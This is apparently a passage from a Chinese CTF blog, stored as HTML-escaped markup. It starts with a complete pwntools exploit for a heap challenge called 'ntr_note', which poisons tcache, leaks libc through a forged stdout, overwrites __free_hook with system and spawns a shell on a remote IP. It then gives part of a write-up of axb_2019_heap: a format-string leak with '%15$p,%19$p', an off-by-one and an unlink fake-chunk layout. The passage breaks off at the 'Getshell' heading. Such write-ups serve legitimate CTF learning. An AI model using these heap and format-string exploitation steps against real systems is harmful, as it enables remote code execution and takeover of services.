line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; galatea&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.update( os = &lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,timeout = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binary = &lt;span class=&#34;string&#34;&gt;&amp;#x27;ntr_note&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ntr_note&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc =elf.libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.binary = binary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DEBUG = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; DEBUG:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  p = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./ntr_note&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;#p = process([&amp;quot;qemu-aarch64&amp;quot;,&amp;quot;-L&amp;quot;,&amp;quot;&amp;quot;,binary])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;#p = process([&amp;quot;qemu-aarch64&amp;quot;,&amp;quot;-L&amp;quot;,&amp;quot;&amp;quot;,-g,&amp;quot;1234&amp;quot;,binary])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  host = &lt;span class=&#34;string&#34;&gt;&amp;quot;81.68.86.115&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  port =  &lt;span class=&#34;string&#34;&gt;&amp;quot;10000&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  p = remote(host,port)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l64 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;     	: u64(p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;\x7f&amp;quot;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;l32 = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;     	: u32(p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;\xf7&amp;quot;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:].ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; a,b  	: p.sendlineafter(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(a),&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(b))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; a,b 	: p.sendafter(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(a),&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(b))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lg  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; name,data : p.success(name + &lt;span class=&#34;string&#34;&gt;&amp;quot;: 0x%x&amp;quot;&lt;/span&gt; % data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;se  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; payload	: p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rl  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;      	: p.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; payload	: p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru  = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; a    	: p.recvuntil(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(a))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rint= &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; a    	: &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;( p.recv(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(a)))[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:] , &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;dbg&lt;/span&gt;():&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;cmd&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;num&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sla(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice &amp;gt;&amp;gt;&amp;quot;&lt;/span&gt;,num)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;size,content&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cmd(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sla(&lt;span class=&#34;string&#34;&gt;&amp;quot;size:&amp;quot;&lt;/span&gt;,size)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sla(&lt;span class=&#34;string&#34;&gt;&amp;quot;content:&amp;quot;&lt;/span&gt;,content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;delete&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cmd(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sla(&lt;span class=&#34;string&#34;&gt;&amp;quot;idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;,content&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cmd(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sla(&lt;span class=&#34;string&#34;&gt;&amp;quot;idx:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sa(&lt;span class=&#34;string&#34;&gt;&amp;quot;content:&amp;quot;&lt;/span&gt;,content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;to_pwn&lt;/span&gt;():&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aaaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aaaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aaaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aaaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  delete(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  delete(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  edit(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, p16(&lt;span class=&#34;number&#34;&gt;0x7010&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;#dbg()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  edit(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x0007000700070007&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  delete(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  delete(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  delete(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  edit(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;\xb0&amp;quot;&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  edit(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,p16(&lt;span class=&#34;number&#34;&gt;0x26a0&lt;/span&gt;)) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  edit(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0x0001000100010001&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  payload = p64(&lt;span class=&#34;number&#34;&gt;0xfbad1800&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; + &lt;span class=&#34;string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,payload) &lt;span class=&#34;comment&#34;&gt;#11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  leak = l64()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  stdout = leak + &lt;span class=&#34;number&#34;&gt;0x336da&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  libc_base = stdout - libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;quot;_IO_2_1_stdout_&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  system_addr = libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __free_hook = libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;quot;__free_hook&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __malloc_hook = libc_base + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;quot;__malloc_hook&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  lg(&lt;span class=&#34;string&#34;&gt;&amp;quot;leak&amp;quot;&lt;/span&gt;,leak)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  lg(&lt;span class=&#34;string&#34;&gt;&amp;quot;stdout&amp;quot;&lt;/span&gt;,stdout)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  lg(&lt;span class=&#34;string&#34;&gt;&amp;quot;__free_hook&amp;quot;&lt;/span&gt;,__free_hook)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  lg(&lt;span class=&#34;string&#34;&gt;&amp;quot;__malloc_hook&amp;quot;&lt;/span&gt;,__malloc_hook)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#13&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh\x00&amp;quot;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#14&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  delete(&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  delete(&lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  edit(&lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;,p64(__free_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  add(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,p64(system_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  delete(&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    i += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    log.warn(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        to_pwn()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; Exception:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p = remote(host,port)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

 &lt;center&gt;&lt;img src=&#34;/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/unlink.png&#34;&gt;&lt;/center&gt;
&lt;a id=&#34;more&#34;&gt;&lt;/a&gt;
&lt;h1 id=&#34;axb_2019_heap&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#axb_2019_heap&#34;&gt;#&lt;/a&gt; axb_2019_heap&lt;/h1&gt;
&lt;h2 id=&#34;初探&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#初探&#34;&gt;#&lt;/a&gt; 初探&lt;/h2&gt;
&lt;p&gt;保护全开，特别哈人&lt;/p&gt;
&lt;center&gt;&lt;img src=&#34;/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/1.png&#34;&gt;&lt;/center&gt;
&lt;p&gt;接下来打开 IDA 康康，可以发现开始有一个格式化字符串漏洞，那么我们可以用格式化字符串泄露栈上的值，那么我们最好是可以通过这个泄露出开 PIE 后的基地址和 libc 的基地址，这样就方便后面的操作&lt;/p&gt;
&lt;center&gt;&lt;img src=&#34;/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/2.png&#34;&gt;&lt;/center&gt;
&lt;p&gt;输入函数存在可以溢出一个字节存在 off-by-one~~，既然存在 off-by-one 那么理应是有几种利用方法的，但我觉得 Unlink 更加 OK（~~&lt;/p&gt;
&lt;center&gt;&lt;img src=&#34;/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/3.png&#34;&gt;&lt;/center&gt;
&lt;h2 id=&#34;泄露地址&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#泄露地址&#34;&gt;#&lt;/a&gt; 泄露地址&lt;/h2&gt;
&lt;p&gt;我们在利用格式化字符串进行泄露时，我们可以动态调试一下，去看看栈上有哪些可以利用的地方，并且格式化字符串也并不是一次只能泄露出一个地址，我们可以贪心地把我们需要的栈上变量都泄露出来&lt;/p&gt;
&lt;p&gt;这里我们寻找栈上的变量直接发现第 10 个和第 14 个就是我们需要泄露的数据，（当然这里也可以找别的，只要能算出来就行…），又由于 64 位传参，前 6 个参数不在栈上所以是 10 + 6-1 和 14 + 6-1 为什么 - 1 懂的都懂&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;%15$p,%19$p&lt;/p&gt;
&lt;/blockquote&gt;
&lt;center&gt;&lt;img src=&#34;/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/4.png&#34;&gt;&lt;/center&gt;
&lt;p&gt;泄露之后我们就可以把开 PIE 后的基地址算出来，最后把指针数组的地址算出来就可以进行下一步利用了；&lt;/p&gt;
&lt;h2 id=&#34;unlink&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#unlink&#34;&gt;#&lt;/a&gt; Unlink&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;我们先申请 4 个堆块，既然要造成 Unlink&lt;sup class=&#34;footnote-ref&#34;&gt;&lt;a href=&#34;#fn1&#34; id=&#34;fnref1&#34;&gt;[1]&lt;/a&gt;&lt;/sup&gt;，那么 free 的那个大小应该至少属于 unsortedbin，大小大于 0x88 就可以，这里我们申请 0x98 大小的堆块，刚好就可以溢出到下一个堆块的 size 位&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;改写一个 unsortedbin 之前的堆块，伪造出&lt;kbd&gt;fake_chunk&lt;/kbd&gt;的结构（在一个正常堆块里伪造出一个 bin 结构）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;提一嘴为什么是 ptr-0x8，因为我首先 malloc 了一个 chunk 没用它，其后我们要找一个指针指向我们的第二个 chunk 的数据段，当然就应该找数组存放的第二个指针了，用这个指针构造出一前一后两个 chunk 和&lt;kbd&gt;fake_chunk&lt;/kbd&gt;相互 link 的假象，那么再释放第三个 chunk 时就会触发 Unlink，让其和前一个&lt;kbd&gt;fake_chunk&lt;/kbd&gt;合并，合并的时候&lt;kbd&gt;fake_chunk&lt;/kbd&gt;和数组 chunk 解连接，让数组的一个指针指向自己，完成 unlink&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;0xA1&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;pre_size=0&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;size=0x80&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;fd=ptr-0x8&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;bk=ptr&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;…&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;…&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0x80&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;0xa0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;删除第三个堆块，让触发 unlink，这里数组的第二个指针指向了数组地址 - 0x8 位置&lt;/li&gt;
&lt;/ol&gt;
&lt;center&gt;&lt;img src=&#34;/CTF/%E8%AE%B0%E4%B8%80%E9%81%93Unlink/5.png&#34;&gt;&lt;/center&gt;
&lt;h2 id=&#34;getshell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#getshell&#34;&gt;#&lt;/a&gt; Getshell&lt;/h2&gt;
&lt;ol&gt;
